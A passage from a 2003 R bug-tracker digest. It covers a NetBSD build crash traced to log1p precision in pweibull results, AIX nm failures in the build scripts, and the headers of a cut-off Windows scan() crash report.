> (dd <- sapply(1:10, function(i)paste((9:0)[1:i],collapse="")))
 [1] "9"          "98"         "987"        "9876"       "98765"
 [6] "987654"     "9876543"    "98765432"   "987654321"  "9876543210"
> np <- nchar(pd <- prettyNum(dd, big.mark="'"))
> stopifnot(sapply(0:2, function(m)
+ 	   all(grep("'", substr(pd, 1, np - 4*m)) == (4+3*m):10)))
> ## end of moved from format.Rd
>
>
> ## Geometric
> pp <- sort(c((1:9)/10, 1 - .2^(2:8)))
> print(qg <- qgeom(pp, prob = .2))
 [1]  0  0  1  2  3  4  5  7 10 14 21 28 36 43 50 57
> ## test that qgeom is an inverse of pgeom
> print(qg1 <- qgeom(pgeom(qg, prob=.2), prob =.2))
 [1]  0  0  1  2  3  4  5  7 10 14 21 28 36 43 50 57

==> 2837.followup.2 <==
From ripley@stats.ox.ac.uk Sat May  3 18:07:46 2003
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h43G7j2b001509
	for <R-bugs@biostat.ku.dk>; Sat, 3 May 2003 18:07:45 +0200 (MET DST)
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.12.9/8.12.9) with ESMTP id h43G7iUK026908;
	Sat, 3 May 2003 17:07:44 +0100 (BST)
Date: Sat, 3 May 2003 17:07:44 +0100 (BST)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender: ripley@gannet.stats
To: beebe@math.utah.edu
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R-1.7.0 build feedback: NetBSD 1.6 (PR#2837)
In-Reply-To: <200305031410.h43EAB2b001238@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.44.0305031519400.7222-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Sat, 3 May 2003 beebe@math.utah.edu wrote:

> This is a followup to my report of a SIGSEGV in R-1.7.0 built
> on NetBSD 1.6.
> 
> Kurt Hornik responded:
> 
> >> ...
> >> After some discussions on r-core, two suggestions.
> >>
> >> * It might be helpful to know if zlib has found in the OS or compiled
> >>   from the sources within R: if the first you could try configure
> >>   --without-zlib as it is possible the OS has a modified version.
> >>
> >> * You have
> >>
> >>   R : Copyright 2003, The R Development Core Team
> >>   Version 1.7.0 Under development (unstable) (2003-04-11)
> >>                       ^^^^^^^^^^^^^^^^^^^^^^         ^^^
> >>
> >>   and might just have hit a bad day of the r-devel daily snapshot.
> >> ...
> 
> I don't think that the latter is the problem.  This version built,
> validated, and installed on several other platforms.
> 
> Since my initial bug report for this system, I upgraded the gcc
> release from 3.2.2 to the latest 3.2.3, so the compilation environment
> is now a bit different.
> 
> I tried your suggestion of the --without-zlib configure option, and
> that produced a working R, which I've installed.  There was one *.fail
> file in the tests directory: reg-tests-1.Rout.fail.  It is 2280 lines
> long, and contains a fair number of "Error xxx" reports.

About 12 are expected.  The error will be in the last command line, so 
only the last few lines of the file are relevant: to wit

> ## pweibull(large, log=T):
> stopifnot(pweibull(seq(1,50,len=1001), 2,3, log = TRUE) < 0)
Error: pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE) < 0 is not TRUE

for which you would need to investigate the output of

pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE) 

and I guess that this is an accuracy problem in the runtime (libc).

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272866 (PA)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 2837.followup.3 <==
From mailnull@stat.math.ethz.ch Sun May  4 16:05:08 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h44E572b004715
	for <R-bugs@biostat.ku.dk>; Sun, 4 May 2003 16:05:08 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h44E54Vn021972
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Sun, 4 May 2003 16:05:04 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h44E54OH021967
	for R-bugs@biostat.ku.dk; Sun, 4 May 2003 16:05:04 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h44E4qVm021809
	for <r-bugs@lists.r-project.org>; Sun, 4 May 2003 16:04:52 +0200 (MEST)
Received: from sunshine.math.utah.edu ([128.110.198.2] ident=[I6d9LC0zKIVZGy1Fx7n2/rXULuWgbU18])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19CK6m-00043O-00
	for <r-bugs@r-project.org>; Sun, 04 May 2003 09:04:52 -0500
Received: from suncore.math.utah.edu (IDENT:bHftZpkqdwdSaDBF4o7e+TqImxj8h41k@suncore.math.utah.edu [128.110.198.5])
	by sunshine.math.utah.edu (8.9.3p2/8.9.3) with ESMTP id IAA16217;
	Sun, 4 May 2003 08:04:49 -0600 (MDT)
Received: (from beebe@localhost)
	by suncore.math.utah.edu (8.9.3p2/8.9.3) id IAA04834;
	Sun, 4 May 2003 08:04:48 -0600 (MDT)
Date: Sun, 4 May 2003 08:04:48 -0600 (MDT)
From: "Nelson H. F. Beebe" <beebe@math.utah.edu>
To: r-bugs@r-project.org
Cc: beebe@math.utah.edu
X-US-Mail: "Center for Scientific Computing, Department of Mathematics, 110
        LCB, University of Utah, 155 S 1400 E RM 233, Salt Lake City, UT
        84112-0090, USA"
X-Telephone: +1 801 581 5254
X-FAX: +1 801 585 1640, +1 801 581 4148
X-URL: http://www.math.utah.edu/~beebe
Subject: Re: [Rd] R-1.7.0 build feedback: NetBSD 1.6 (PR#2837): final report
Message-ID: <CMM.0.92.0.1052057088.beebe@suncore.math.utah.edu>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Spam-Status: No, hits=-3.2 required=5.0 tests=QUOTED_EMAIL_TEXT version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)

I've now done two rebuilds of R-1.7.0 on NetBSD 1.6, one with the
--without-zlib configure option, and one without.  Both builds use the
recently-installed gcc-3.2.3 compiler.

As before, the one built normally gets a segment violation, whereas
the one built with the --without-zlib option works.

The odd thing is that neither uses shared libraries for zlib:

	% ldd /usr/local/lib/R/bin/R.bin
	/usr/local/lib/R/bin/R.bin:
		 -lm.0 => /usr/lib/libm387.so.0
		 -lm.0 => /usr/lib/libm.so.0
		 -lg2c.0 => /usr/local/lib/libg2c.so.0
		 -lc.12 => /usr/lib/libc.so.12
		 -lgcc_s.1 => /usr/local/lib/libgcc_s.so.1

The other build shows the same library list.

The NetBSD 1.6 system ships with these libraries:

	/usr/lib/libz.a   /usr/lib/libz.so.0    /usr/lib/libz_p.a
	/usr/lib/libz.so  /usr/lib/libz.so.0.2  /usr/lib/libz_pic.a

but the pkg_info commands on NetBSD and OpenBSD produce no output.

There seems to be no simple way to confirm the zlib version on these
systems.  Running strings and nm on libz.a produces no useful
identification.  However, /usr/include/zlib.h reports "version 1.1.4,
March 11th, 2002", which is the same as the one that I installed in
/usr/local/, and is the latest stable release (I'm on the zlib beta
testers list).  That number is confirmed by this simple test program:

	% cat show-zlib-version.c
	#include <stdio.h>
	#include <stdlib.h>
	#include <zlib.h>

	int
	main()
	{
	    (void)printf("zlibVersion() reports [%s]\n", zlibVersion());
	    return (EXIT_SUCCESS);
	}

	% cc show-zlib-version.c -lz && ./a.out
	zlibVersion() reports [1.1.4]

The bad one only segment faults after installation.  If I run it in
the build tree as bin/R, it works, and passes all but the base-Ex
test.

Brian Ripley responds to the reg-tests-1.Rout.fail file found in the
working build:

>> ...
>> The error will be in the last command line, so
>> only the last few lines of the file are relevant: to wit
>>
>> > ## pweibull(large, log=T):
>> > stopifnot(pweibull(seq(1,50,len=1001), 2,3, log = TRUE) < 0)
>> Error: pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE) < 0 is not TRUE
>>
>> for which you would need to investigate the output of
>>
>> pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE)
>>
>> and I guess that this is an accuracy problem in the runtime (libc).
>> ...

Here is what I get in that output:

	% R

	R : Copyright 2003, The R Development Core Team
	Version 1.7.0 Under development (unstable) (2003-04-11)

	R is free software and comes with ABSOLUTELY NO WARRANTY.
	You are welcome to redistribute it under certain conditions.
	Type `license()' or `licence()' for distribution details.

	R is a collaborative project with many contributors.
	Type `contributors()' for more information.

	Type `demo()' for some demos, `help()' for on-line help, or
	`help.start()' for a HTML browser interface to help.
	Type `q()' to quit R.

	> pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE)
	  [1] -2.252266e+00 -2.162061e+00 -2.076474e+00 -1.995124e+00 -1.917675e+00
	   [6] -1.843830e+00 -1.773331e+00 -1.705943e+00 -1.641459e+00 -1.579693e+00
	  [11] -1.520477e+00 -1.463659e+00 -1.409102e+00 -1.356679e+00 -1.306276e+00
	  [16] -1.257788e+00 -1.211118e+00 -1.166177e+00 -1.122883e+00 -1.081160e+00
	  [21] -1.040937e+00 -1.002149e+00 -9.647332e-01 -9.286334e-01 -8.937957e-01
	  [26] -8.601698e-01 -8.277083e-01 -7.963667e-01 -7.661032e-01 -7.368779e-01
	  [31] -7.086534e-01 -6.813940e-01 -6.550661e-01 -6.296376e-01 -6.050778e-01
	  [36] -5.813577e-01 -5.584494e-01 -5.363265e-01 -5.149634e-01 -4.943358e-01
	  [41] -4.744204e-01 -4.551946e-01 -4.366369e-01 -4.187266e-01 -4.014437e-01
	  [46] -3.847688e-01 -3.686833e-01 -3.531692e-01 -3.382092e-01 -3.237864e-01
	  [51] -3.098845e-01 -2.964877e-01 -2.835807e-01 -2.711486e-01 -2.591770e-01
	  [56] -2.476519e-01 -2.365597e-01 -2.258870e-01 -2.156210e-01 -2.057491e-01
	  [61] -1.962592e-01 -1.871392e-01 -1.783776e-01 -1.699631e-01 -1.618847e-01
	  [66] -1.541315e-01 -1.466932e-01 -1.395596e-01 -1.327205e-01 -1.261664e-01
	  [71] -1.198878e-01 -1.138753e-01 -1.081199e-01 -1.026130e-01 -9.734578e-02
	  [76] -9.231000e-02 -8.749747e-02 -8.290025e-02 -7.851057e-02 -7.432090e-02
	  [81] -7.032386e-02 -6.651231e-02 -6.287926e-02 -5.941794e-02 -5.612173e-02
	  [86] -5.298423e-02 -4.999919e-02 -4.716054e-02 -4.446239e-02 -4.189903e-02
	  [91] -3.946490e-02 -3.715463e-02 -3.496298e-02 -3.288491e-02 -3.091551e-02
	  [96] -2.905005e-02 -2.728393e-02 -2.561271e-02 -2.403212e-02 -2.253801e-02
	 [101] -2.112637e-02 -1.979336e-02 -1.853526e-02 -1.734848e-02 -1.622957e-02
	 [106] -1.517522e-02 -1.418223e-02 -1.324752e-02 -1.236817e-02 -1.154132e-02
	 [111] -1.076427e-02 -1.003442e-02 -9.349278e-03 -8.706452e-03 -8.103661e-03
	 [116] -7.538723e-03 -7.009554e-03 -6.514161e-03 -6.050648e-03 -5.617201e-03
	 [121] -5.212098e-03 -4.833694e-03 -4.480428e-03 -4.150814e-03 -3.843441e-03
	 [126] -3.556967e-03 -3.290122e-03 -3.041701e-03 -2.810561e-03 -2.595622e-03
	 [131] -2.395859e-03 -2.210307e-03 -2.038050e-03 -1.878228e-03 -1.730026e-03
	 [136] -1.592676e-03 -1.465456e-03 -1.347685e-03 -1.238723e-03 -1.137968e-03
	 [141] -1.044855e-03 -9.588518e-04 -8.794615e-04 -8.062168e-04 -7.386800e-04
	 [146] -6.764415e-04 -6.191181e-04 -5.663515e-04 -5.178069e-04 -4.731716e-04
	 [151] -4.321541e-04 -3.944823e-04 -3.599030e-04 -3.281801e-04 -2.990941e-04
	 [156] -2.724409e-04 -2.480308e-04 -2.256875e-04 -2.052476e-04 -1.865595e-04
	 [161] -1.694827e-04 -1.538870e-04 -1.396520e-04 -1.266662e-04 -1.148267e-04
	 [166] -1.040384e-04 -9.421341e-05 -8.527081e-05 -7.713589e-05 -6.973986e-05
	 [171] -6.301937e-05 -5.691614e-05 -5.137658e-05 -4.635146e-05 -4.179554e-05
	 [176] -3.766734e-05 -3.392878e-05 -3.054498e-05 -2.748400e-05 -2.471657e-05
	 [181] -2.221595e-05 -1.995767e-05 -1.791939e-05 -1.608070e-05 -1.442298e-05
	 [186] -1.292925e-05 -1.158404e-05 -1.037325e-05 -9.284062e-06 -8.304808e-06
	 [191] -7.424880e-06 -6.634643e-06 -5.925350e-06 -5.289063e-06 -4.718585e-06
	 [196] -4.207393e-06 -3.749581e-06 -3.339801e-06 -2.973218e-06 -2.645460e-06
	 [201] -2.352578e-06 -2.091005e-06 -1.857524e-06 -1.649233e-06 -1.463518e-06
	 [206] -1.298022e-06 -1.150627e-06 -1.019425e-06 -9.027020e-07 -7.989171e-07
	 [211] -7.066874e-07 -6.247715e-07 -5.520563e-07 -4.875440e-07 -4.303409e-07
	 [216] -3.796467e-07 -3.347456e-07 -2.949976e-07 -2.598306e-07 -2.287339e-07
	 [221] -2.012514e-07 -1.769765e-07 -1.555466e-07 -1.366387e-07 -1.199652e-07
	 [226] -1.052701e-07 -9.232584e-08 -8.093002e-08 -7.090295e-08 -6.208508e-08
	 [231] -5.433485e-08 -4.752674e-08 -4.154950e-08 -3.630461e-08 -3.170488e-08
	 [236] -2.767316e-08 -2.414125e-08 -2.104887e-08 -1.834283e-08 -1.597615e-08
	 [241] -1.390740e-08 -1.210008e-08 -1.052202e-08 -9.144876e-09 -7.943739e-09
	 [246] -6.896685e-09 -5.984448e-09 -5.190104e-09 -4.498796e-09 -3.897489e-09
	 [251] -3.374750e-09 -2.920564e-09 -2.526156e-09 -2.183845e-09 -1.886912e-09
	 [256] -1.629483e-09 -1.406425e-09 -1.213253e-09 -1.046054e-09 -9.014167e-10
	 [261] -7.763638e-10 -6.683025e-10 -5.749754e-10 -4.944174e-10 -4.249193e-10
	 [266] -3.649955e-10 -3.133551e-10 -2.688775e-10 -2.305899e-10 -1.976489e-10
	 [271] -1.693233e-10 -1.449798e-10 -1.240699e-10 -1.061191e-10 -9.071710e-11
	 [276] -7.750911e-11 -6.618894e-11 -5.649181e-11 -4.818967e-11 -4.108569e-11
	 [281] -3.501033e-11 -2.981737e-11 -2.538114e-11 -2.159339e-11 -1.836120e-11
	 [286] -1.560441e-11 -1.325440e-11 -1.125233e-11 -9.547585e-12 -8.096857e-12
	 [291] -6.862844e-12 -5.813794e-12 -4.922507e-12 -4.165557e-12 -3.523182e-12
	 [296] -2.978284e-12 -2.516320e-12 -2.124856e-12 -1.793343e-12 -1.512790e-12
	 [301] -1.275424e-12 -1.074696e-12 -9.050538e-13 -7.618350e-13 -6.409318e-13
	 [306] -5.389023e-13 -4.528600e-13 -3.803624e-13 -3.193001e-13 -2.678968e-13
	 [311] -2.247091e-13 -1.882938e-13 -1.577627e-13 -1.321165e-13 -1.105782e-13
	 [316] -9.248158e-14 -7.727152e-14 -6.461498e-14 -5.395684e-14 -4.496403e-14
	 [321] -3.752554e-14 -3.130829e-14 -2.609024e-14 -2.176037e-14 -1.809664e-14
	 [326] -1.498801e-14 -1.254552e-14 -1.043610e-14 -8.659740e-15 -7.216450e-15
	 [331] -5.995204e-15 -4.884981e-15 -4.107825e-15 -3.330669e-15 -2.775558e-15
	 [336] -2.331468e-15 -1.887379e-15 -1.554312e-15 -1.332268e-15 -1.110223e-15
	 [341] -8.881784e-16 -7.771561e-16 -5.551115e-16 -5.551115e-16 -4.440892e-16
	 [346] -3.330669e-16 -3.330669e-16 -2.220446e-16 -2.220446e-16 -1.110223e-16
	 [351] -1.110223e-16 -1.110223e-16 -1.110223e-16 -1.110223e-16 -1.110223e-16
	 [356]  0.000000e+00  0.000000e+00  0.000000e+00  0.000000e+00  0.000000e+00
	...all lines are zero from here on...
	 [996]  0.000000e+00  0.000000e+00  0.000000e+00  0.000000e+00  0.000000e+00
	[1001]  0.000000e+00

When I compare it with output from FreeBSD 5.0 on the same platform, I
get 4 columns instead of 5, and the numbers are nonzero right up to
the last:

	> pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE)
	   [1]  -2.252266e+00  -2.162061e+00  -2.076474e+00  -1.995124e+00
	   [5]  -1.917675e+00  -1.843830e+00  -1.773331e+00  -1.705943e+00
	...
	 [993] -1.765317e-119 -1.028280e-119 -5.986435e-120 -3.483321e-120
	 [997] -2.025755e-120 -1.177467e-120 -6.840359e-121 -3.971708e-121
	[1001] -2.304857e-121

On OpenBSD 3.2 on the same platform (all of these systems run on top
of VMware on top of GNU/Linux 7.2 or 8.0 on Pentium III 600MHz dual
CPU servers), I get 5-column output, and trailing zeros:

	> pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE)
	   [1] -2.252266e+00 -2.162061e+00 -2.076474e+00 -1.995124e+00 -1.917675e+00
	   [6] -1.843830e+00 -1.773331e+00 -1.705943e+00 -1.641459e+00 -1.579693e+00
	  [11] -1.520477e+00 -1.463659e+00 -1.409102e+00 -1.356679e+00 -1.306276e+00
	  [16] -1.257788e+00 -1.211118e+00 -1.166177e+00 -1.122883e+00 -1.081160e+00
	  [21] -1.040937e+00 -1.002149e+00 -9.647332e-01 -9.286334e-01 -8.937957e-01
	...

	 [351] -1.110223e-16 -1.110223e-16 -1.110223e-16 -1.110223e-16 -1.110223e-16
	 [356]  0.000000e+00  0.000000e+00  0.000000e+00  0.000000e+00  0.000000e+00
	...
	 [996]  0.000000e+00  0.000000e+00  0.000000e+00  0.000000e+00  0.000000e+00
	[1001]  0.000000e+00

On Solaris 9 x86 on the same platform, I get 4-column output:

	> pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE)
	   [1]  -2.252266e+00  -2.162061e+00  -2.076474e+00  -1.995124e+00
	   [5]  -1.917675e+00  -1.843830e+00  -1.773331e+00  -1.705943e+00
	   [9]  -1.641459e+00  -1.579693e+00  -1.520477e+00  -1.463659e+00
	  [13]  -1.409102e+00  -1.356679e+00  -1.306276e+00  -1.257788e+00
	  [17]  -1.211118e+00  -1.166177e+00  -1.122883e+00  -1.081160e+00
	...
	 [353]  -8.543005e-17  -7.001648e-17  -5.735327e-17  -4.695528e-17
	 [357]  -3.842190e-17  -3.142256e-17  -2.568459e-17  -2.098321e-17
	 [361]  -1.713324e-17  -1.398220e-17  -1.140459e-17  -9.297196e-18
	...
	 [993] -1.765317e-119 -1.028280e-119 -5.986435e-120 -3.483321e-120
	 [997] -2.025755e-120 -1.177467e-120 -6.840359e-121 -3.971708e-121
	[1001] -2.304857e-121

On the underlying GNU/Linux systems, I get 4-column output:

	> pweibull(seq(1, 50, len = 1001), 2, 3, log = TRUE)
	   [1]  -2.252266e+00  -2.162061e+00  -2.076474e+00  -1.995124e+00
	   [5]  -1.917675e+00  -1.843830e+00  -1.773331e+00  -1.705943e+00
	   [9]  -1.641459e+00  -1.579693e+00  -1.520477e+00  -1.463659e+00
	  [13]  -1.409102e+00  -1.356679e+00  -1.306276e+00  -1.257788e+00
	  [17]  -1.211118e+00  -1.166177e+00  -1.122883e+00  -1.081160e+00
	...
	 [353]  -8.543005e-17  -7.001648e-17  -5.735327e-17  -4.695528e-17
	 [357]  -3.842190e-17  -3.142256e-17  -2.568459e-17  -2.098321e-17
	 [361]  -1.713324e-17  -1.398220e-17  -1.140459e-17  -9.297196e-18
	...
	 [997] -2.025755e-120 -1.177467e-120 -6.840359e-121 -3.971708e-121
	[1001] -2.304857e-121

I'd like to get to the bottom of these differences.  My numerical
calculator project, extended hoc

	http://www.math.utah.edu/hoc

has an extensive battery of validation tests, which have turned up
bugs in the math library on a half-dozen systems, including a couple
in glibc.  However, although the tests show some differences between
the four guest O/Ses, the chi-square and incomplete gamma function
tests pass.

The tests reveal that OpenBSD has these anomalies: exp(-Inf) -> NaN,
exp(Inf) -> Inf, but exp(-MAXNORMAL) -> 0 and exp(MAXNORMAL) -> +Inf,
as expected.

Examination of the R-1.7.0/src/nmath/pweibull.c file shows that
pweibull() calls pow(), log(), log1p(), and R_D_exp(), and the latter
is defined in ./src/nmath/dpq.h as

#define R_D_exp(x)       (log_p  ?  (x)   : exp(x))      /* exp(x) */

I therefore tried some experiments with hoc, using log1p() as the most
likely candidate for errors, since it is quite new, and much less used
than exp() and log().  And voilà, log1p() is at least part of the
problem:

FreeBSD, Solaris 9 x86, GNU/Linux, Solaris SPARC:

	hoc64> for (k = 0; k <= 100; ++k) println k, log1p(2^-k)
	0 0.69314718055994529
	1 0.40546510810816438
	...
	50 8.8817841970012484e-16
	51 4.4408920985006252e-16
	52 2.2204460492503128e-16
	53 1.1102230246251565e-16
	...
	99 1.5777218104420236e-30
	100 7.8886090522101181e-31

NetBSD, OpenBSD:

	hoc64> for (k = 0; k <= 100; ++k) println k, log1p(2^-k)
	0 0.69314718055994529
	1 0.40546510810816438
	...
	50 8.8817841970012484e-16
	51 4.4408920985006252e-16
	52 2.2204460492503128e-16
	53 0
	54 0
	...
	99 0
	100 0

OpenBSD 3.3 was announced earlier this week, so if my colleague who
installs these systems can find the time, we may be able to test it as
well.

log1p will now get some additional tests in the hoc validation suite.

-------------------------------------------------------------------------------
- Nelson H. F. Beebe                    Tel: +1 801 581 5254                  -
- Center for Scientific Computing       FAX: +1 801 581 4148                  -
- University of Utah                    Internet e-mail: beebe@math.utah.edu  -
- Department of Mathematics, 110 LCB        beebe@acm.org  beebe@computer.org -
- 155 S 1400 E RM 233                       beebe@ieee.org                    -
- Salt Lake City, UT 84112-0090, USA    URL: http://www.math.utah.edu/~beebe  -

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2887 *
Subject: tools/ldAIX4 Assumes AIX nm
From: rgrubbfink@cox.net
Date: Wed, 30 Apr 2003 22:24:34 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2887 <==
From rgrubbfink@cox.net Wed Apr 30 22:24:34 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3UKOY2b010902
	for <R-bugs@biostat.ku.dk>; Wed, 30 Apr 2003 22:24:34 +0200 (MET DST)
Date: Wed, 30 Apr 2003 22:24:34 +0200 (MET DST)
Message-Id: <200304302024.h3UKOY2b010902@pubhealth.ku.dk>
From: rgrubbfink@cox.net
To: R-bugs@biostat.ku.dk
Subject: tools/ldAIX4 Assumes AIX nm

Full_Name: Richard L. Grubb
Version: 1.6.2
OS: AIX 4.3.3
Submission from: (NULL) (130.76.96.17)


The ldAIX4 script in the tools directory calls the nm program, assuming it is
the
nm supplied with AIX. However, I have GNU nm in $HOME/bin, and it was being
executed
instead of /usr/bin/nm or /bin/nm. The script failed silently, and caused
downstream
problems because etc/R.exp was empty.

I ran into this same bug under R 1.7.0, but have not verified my fix yet (I
backed up
to version 1.6.2 to see if I could build it). My fix was to replace the line
"nm=nm"
in the script ldAIX4 with "nm=/bin/nm"

See also my bug report on nm not being able to read src/main/dounzip.o

==> 2887.audit <==
Fri May  2 22:28:30 2003	maechler	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2888 *
Subject: AIX 4.3.3 nm will not read all of dounzip.o
From: rgrubbfink@cox.net
Date: Wed, 30 Apr 2003 22:33:24 +0200 (MET DST)
--Looks like an AIX bug, not an R one.
--Other people have succeeded on AIX 5.1.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2888 <==
From rgrubbfink@cox.net Wed Apr 30 22:33:24 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3UKXO2b010936
	for <R-bugs@biostat.ku.dk>; Wed, 30 Apr 2003 22:33:24 +0200 (MET DST)
Date: Wed, 30 Apr 2003 22:33:24 +0200 (MET DST)
Message-Id: <200304302033.h3UKXO2b010936@pubhealth.ku.dk>
From: rgrubbfink@cox.net
To: R-bugs@biostat.ku.dk
Subject: AIX 4.3.3 nm will not read all of dounzip.o

Full_Name: Richard L. Grubb
Version: 1.6.2
OS: AIX 4.3.3
Submission from: (NULL) (130.76.96.17)


The tools/ldAIX4 script fails when it tries to execute nm -p -g -h dounzip.o.

The output is:

__mull               U          -                                               
                                    
__divss              U          -                                               
                                    
__divus              U          -                                               
                                    
__quoss              U          -                                               
                                    
__quous              U          -                                               
                                    
.mkdir               U          -                                               
                                    
.strlen              U          -                                               
                                    
.strcpy              U          -                                               
                                    
.strcat              U          -                                               
                                    
...[SNIP]...
.inflateInit2_       U          -                                               
                                    
.crc32               U          -                                               
                                    
.inflate             U          -                                               
                                    
.inflateEnd          U          -                                               
                                    
.do_int_unzip        T       1084     758                                       
                                    
.R_newunz            T       2904     426                                       
                                    
nm: dounzip.o: 0654-206 Cannot process the symbol table                         
                                    


Whereas Gnu nm -p -g dounzip.o (can't use -h in GNU nm) gives:

                 U __mulh                                                       
                                    
                 U __mull
                 U __divss
                 U __divus
                 U __quoss
                 U __quous
                 U .mkdir
                 U .strlen
                 U .strcpy
                 U .strcat
...[SNIP]...
                 U .crc32
                 U .inflate
                 U .inflateEnd
000000000000043c T .do_int_unzip
0000000000000b58 T .R_newunz
                 U .bb
                 U .eb
                 U .bb
                 U .eb
                 U .bb
                 U .eb
                 U .bb
                 U .eb
                 U .bb
                 U .eb
                 U .bb
                 U .eb
                 U .bb
                 U .eb
                 U .bb
                 U .eb
                 U .bb
                 U .eb
0000000000002a40 T unz_copyright
0000000000002a94 D do_int_unzip 
0000000000002b00 D R_newunz

I deleted dounzip.o from the list of object files to be processed by ldAIX4, and
the
rest of R has compiled ok so far.


==> 2888.audit <==
Fri May  2 22:28:30 2003	maechler	moved from incoming to System-specific
Thu May  8 23:38:22 2003	ripley	changed notes
Thu May  8 23:38:22 2003	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  TooMuchAtOnce

none

Directory:  Windows

* PR# 3234 *
Subject: scan() crash in Windows 98
From: "Simon Fear" <Simon.Fear@synequanon.com>
Date: Wed, 11 Jun 2003 12:09:38 +0100
--Currently unreproducible
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3234 <==
From mailnull@stat.math.ethz.ch Wed Jun 11 13:10:03 2003
Received: from stat.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h5BBA32b018125
	for <R-bugs@biostat.ku.dk>; Wed, 11 Jun 2003 13:10:03 +0200 (MET DST)
Received: from stat.math.ethz.ch (localhost [127.0.0.1])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h5BBA09P019788
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Wed, 11 Jun 2003 13:10:01 +0200 (MEST)
Received: (from mailnull@localhost)
	by stat.math.ethz.ch (8.12.9/8.12.6/Submit) id h5BBA0Uc019785
	for R-bugs@biostat.ku.dk; Wed, 11 Jun 2003 13:10:00 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h5BB9r9O019759
	for <r-bugs@lists.r-project.org>; Wed, 11 Jun 2003 13:09:54 +0200 (MEST)
Received: from anchor-post-39.mail.demon.net ([194.217.242.80])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19Q3UM-00016C-00
	for <r-bugs@r-project.org>; Wed, 11 Jun 2003 06:09:58 -0500
Received: from anchor-sbs-1.mail.demon.net ([194.159.243.143] helo=mail-1.sbs.demon.net)
	by anchor-post-39.mail.demon.net with esmtp (Exim 3.36 #2)
	id 19Q3UG-0003GP-0U
	for r-bugs@r-project.org; Wed, 11 Jun 2003 12:09:52 +0100
Received: from sbs1287.customer.demon.com (synequanon01.synequanon.synequanon.com) [194.159.221.242] 
	by mail-1.sbs.demon.net with esmtp id 19Q3UF-000C5d-01; Wed, 11 Jun 2003 12:09:51 +0100
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1165
content-class: urn:content-classes:message
Subject: scan() crash in Windows 98
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Importance: normal
Priority: normal
Date: Wed, 11 Jun 2003 12:09:38 +0100
Message-ID: <6C8A8033ABC1E3468048ABC4F13CE572AC0CE4@synequanon01>
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
Thread-Topic: scan() crash in Windows 98
Thread-Index: AcMwCfLfvP8BPZvqEdeZ4gAFXWubmQ==
From: "Simon Fear" <Simon.Fear@synequanon.com>
To: <r-bugs@r-project.org>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by stat.math.ethz.ch id h5BB9r9O019759
X-Spam-Status: No, hits=0.0 required=5.0 tests=none version=2.54
X-Spam-Level: 
